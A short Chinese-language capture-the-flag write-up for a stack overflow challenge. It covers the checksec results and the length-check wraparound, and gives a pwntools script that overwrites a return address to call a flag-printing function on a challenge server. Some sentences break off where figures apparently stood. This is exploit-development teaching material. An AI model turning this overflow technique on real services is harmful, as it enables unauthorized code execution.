用checksec分析发现

发现只启用了 NX(No eXecute，数据不可执行)保护机制，因此可以拿来 做栈溢出攻击。（NX 保护开启意味着栈中数据没有执行权限，以前的经 常用的 call esp 或者 jmp esp 的方法就不能使用，但是可以利用 rop 这种 方法绕过）

反编译然后发现需要用

脚本编写如下

```python
from pwn import *
p = remote("61.147.171.105","64370")
cat_flag_addr = 0x0804868B
p.recvuntil('choice:')
p.sendline('1')
p.recvuntil('name:')
p.sendline('pwn')
p.recvuntil('passwd:')
payload = b'a' * 0x14 + b'A'*4 + p32(cat_flag_addr) + (259 - 20 -4 -4) * b'a'
p.sendline(payload)
p.interactive()

```

这里的payload解释如下：

先利用255+4溢出得到4

然后用b'a' * 0x14填充dest,用b'A' * 4 覆盖caller(**这里挺好奇为什么不可以用p32(0)的，后面交流后发现ebp要指向一个貌似合理的地址，p32(0)和p32(1)不行，但是p32(cat_flag_addr)是可以的**)，然后用cat_flag_addr的地址覆盖返回地址，即可获得flag